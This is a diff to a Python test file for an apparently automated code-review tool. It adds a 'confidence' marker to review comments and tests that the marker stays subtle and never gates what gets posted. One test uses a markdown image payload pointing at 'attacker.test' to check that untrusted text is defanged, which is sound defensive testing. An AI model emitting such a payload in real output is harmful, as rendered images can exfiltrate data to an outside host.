@@ -41,12 +41,12 @@ def _comment(
     *, path: str = "app/main.py", start: int = 2, end: int = 2,
     severity: str = "warning", category: str = "logic_error",
     text: str = "This is wrong.", suggestion: str | None = None,
-    failure_scenario: str | None = None,
+    failure_scenario: str | None = None, confidence: str | None = None,
 ) -> ReviewComment:
     return ReviewComment(
         file_path=path, line_start=start, line_end=end,
         severity=severity, category=category, comment_text=text, suggestion=suggestion,
-        failure_scenario=failure_scenario,
+        failure_scenario=failure_scenario, confidence=confidence,
     )
 
 
@@ -186,6 +186,142 @@ def test_comment_body_carries_severity_and_category() -> None:
     )
     assert "critical" in postable[0]["body"]
     assert "security" in postable[0]["body"]
+
+
+def test_comment_body_marks_a_plausible_finding() -> None:
+    postable, _ = partition_comments(
+        [_comment(confidence="plausible")], parse_diff(TWO_HUNK_DIFF)
+    )
+    assert "plausible" in postable[0]["body"]
+
+
+def test_comment_body_says_nothing_for_a_confirmed_finding() -> None:
+    """The common case stays quiet.
+
+    A marker on every comment is not a marker — it is noise in the one line a
+    reader scans to triage, and it would push severity and category further
+    from the eye for no information gained.
+    """
+    postable, _ = partition_comments(
+        [_comment(confidence="confirmed")], parse_diff(TWO_HUNK_DIFF)
+    )
+    assert "plausible" not in postable[0]["body"]
+
+
+def test_comment_body_says_nothing_for_a_null_confidence() -> None:
+    """Every comment written before this column existed.
+
+    Null reads as nothing, the same as `confirmed` — a row that was never asked
+    the question has not answered "plausible", and marking it would invent a
+    hedge the model never made.
+    """
+    postable, _ = partition_comments([_comment()], parse_diff(TWO_HUNK_DIFF))
+    assert "plausible" not in postable[0]["body"]
+
+
+def test_the_marker_is_subdued_not_shouted() -> None:
+    """On a review where a third of findings carry it, a bold shout trains
+    people to skip the header line — taking severity and category with it."""
+    postable, _ = partition_comments(
+        [_comment(confidence="plausible")], parse_diff(TWO_HUNK_DIFF)
+    )
+    head = postable[0]["body"].splitlines()[0]
+    assert "**plausible**" not in head
+    assert "PLAUSIBLE" not in head
+
+
+def test_the_appendix_marks_a_plausible_finding_too() -> None:
+    """A finding must read identically whether it anchored or not.
+
+    The appendix is where findings land when GitHub will not take the line —
+    an accident of the diff, not a property of the finding — so a reader who
+    sees it there and a reader who sees it inline should be told the same thing.
+    """
+    body = build_review_body(
+        "Summary.",
+        event=ReviewEvent("COMMENT"),
+        unanchorable=[_comment(confidence="plausible")],
+    )
+    assert "plausible" in body
+
+
+def test_the_appendix_carries_the_failure_scenario() -> None:
+    """It matters *more* here than inline, not less.
+
+    An unanchorable finding has no diff line attached, so the reader cannot
+    recover the trigger from the code around the comment — this text is all
+    they get. Dropping the scenario here while requiring it everywhere else
+    takes the milestone's one enforced field away from exactly the findings
+    that need it most.
+    """
+    body = build_review_body(
+        "Summary.",
+        event=ReviewEvent("COMMENT"),
+        unanchorable=[
+            _comment(failure_scenario="With items empty, items[-1] raises IndexError.")
+        ],
+    )
+    assert "With items empty, items[-1] raises IndexError." in body
+
+
+def test_the_appendix_scenario_is_defanged() -> None:
+    """Same untrusted string, same treatment as the inline path."""
+    body = build_review_body(
+        "Summary.",
+        event=ReviewEvent("COMMENT"),
+        unanchorable=[
+            _comment(failure_scenario="Fails when ![](https://attacker.test/?d=X)")
+        ],
+    )
+    assert "![](" not in body
+
+
+def test_the_appendix_omits_the_scenario_when_absent() -> None:
+    """A legacy row has none and must not grow a dangling label."""
+    body = build_review_body(
+        "Summary.", event=ReviewEvent("COMMENT"), unanchorable=[_comment()]
+    )
+    assert "Fails when" not in body
+
+
+def test_the_appendix_stays_quiet_for_a_confirmed_finding() -> None:
+    body = build_review_body(
+        "Summary.",
+        event=ReviewEvent("COMMENT"),
+        unanchorable=[_comment(confidence="confirmed")],
+    )
+    assert "plausible" not in body
+
+
+def test_confidence_does_not_change_whether_a_comment_posts() -> None:
+    """Presentation, never gating.
+
+    `partition_comments` decides what reaches GitHub and `resolve_event`
+    decides what verdict is sent; neither may consult confidence. A plausible
+    finding posts like any other, marked — if plausible findings turn out to be
+    noise, that is a follow-up with data behind it, not a filter added on a hunch.
+    """
+    diff = parse_diff(TWO_HUNK_DIFF)
+    confirmed, _ = partition_comments([_comment(confidence="confirmed")], diff)
+    plausible, _ = partition_comments([_comment(confidence="plausible")], diff)
+
+    assert len(confirmed) == len(plausible) == 1
+    assert confirmed[0]["line"] == plausible[0]["line"]
+    assert confirmed[0]["path"] == plausible[0]["path"]
+
+
+def test_resolve_event_cannot_see_confidence() -> None:
+    """The verdict is about the review, not about any one finding's certainty.
+
+    Structural rather than behavioural on purpose: `resolve_event` takes a
+    verdict and two flags and never sees a comment at all, so the guarantee is
+    in its signature. Threading confidence in would have to change that
+    signature, and this is what notices.
+    """
+    import inspect
+
+    params = set(inspect.signature(resolve_event).parameters)
+    assert params == {"verdict", "is_own_pr", "mode"}
 
 
 def test_comment_body_carries_the_failure_scenario() -> None:
